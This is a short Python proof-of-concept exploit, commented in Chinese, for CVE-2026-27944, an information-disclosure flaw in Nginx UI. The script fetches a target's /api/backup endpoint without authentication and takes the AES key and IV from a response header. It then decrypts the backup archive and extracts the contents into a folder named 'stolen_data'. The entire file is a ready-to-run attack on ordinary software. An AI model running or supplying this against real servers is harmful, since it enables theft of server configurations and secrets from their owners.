#!/usr/bin/env python3
import argparse
import base64
import urllib.request
import zipfile
from io import BytesIO
from Crypto.Cipher import AES

def download_and_decrypt(target_url, output_dir):
    # 1. 发起无认证请求
    req = urllib.request.Request(f"{target_url.rstrip('/')}/api/backup", method="GET")
    resp = urllib.request.urlopen(req)
    
    # 2. 从头部提取密钥
    security_header = resp.headers.get('X-Backup-Security', '')
    if ':' not in security_header:
        print("[-] 未找到密钥头")
        return
    key_b64, iv_b64 = security_header.split(':')
    encrypted_backup = resp.read()
    
    print(f"[*] 从响应头获取密钥: {key_b64}")
    print(f"[*] 初始化向量IV: {iv_b64}")
    
    # 3. 准备解密
    key = base64.b64decode(key_b64)
    iv = base64.b64decode(iv_b64)
    
    if len(key) != 32:
        print(f"[-] 密钥长度异常: {len(key)}字节")
        return
    if len(iv) != 16:
        print(f"[-] IV长度异常: {len(iv)}字节")
        return
    
    print(f"[*] AES-256密钥长度: {len(key)}字节")
    print(f"[*] IV长度: {len(iv)}字节")
    
    # 4. 解密函数
    def decrypt_file(encrypted_data, key, iv):
        cipher = AES.new(key, AES.MODE_CBC, iv)
        # 移除可能的PKCS#7填充
        decrypted = cipher.decrypt(encrypted_data)
        padding_len = decrypted[-1]
        if padding_len <= 16:
            decrypted = decrypted[:-padding_len]
        return decrypted
    
    # 5. 解密备份包
    print("[*] 开始解密备份包...")
    with zipfile.ZipFile(BytesIO(encrypted_backup), 'r') as outer_zip:
        for name in outer_zip.namelist():
            print(f"[*] 处理文件: {name}")
            encrypted_content = outer_zip.read(name)
            decrypted_content = decrypt_file(encrypted_content, key, iv)
            
            if name == 'hash_info.txt':
                print(f"[+] hash_info.txt内容: {decrypted_content.decode()}")
            elif name.endswith('.zip'):
                # 这是另一个zip，需要进一步提取
                inner_zip = zipfile.ZipFile(BytesIO(decrypted_content), 'r')
                for inner_name in inner_zip.namelist():
                    print(f"[-] 提取: {inner_name}")
                    inner_zip.extract(inner_name, output_dir)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CVE-2026-27944 Nginx UI 信息泄露漏洞POC')
    parser.add_argument('--target', required=True, help='目标URL，如http://192.168.1.100:9000')
    parser.add_argument('--output', default='./stolen_data', help='输出目录')
    args = parser.parse_args()
    
    download_and_decrypt(args.target, args.output)
    print(f"[+] 解密完成！文件保存在 {args.output} 目录")
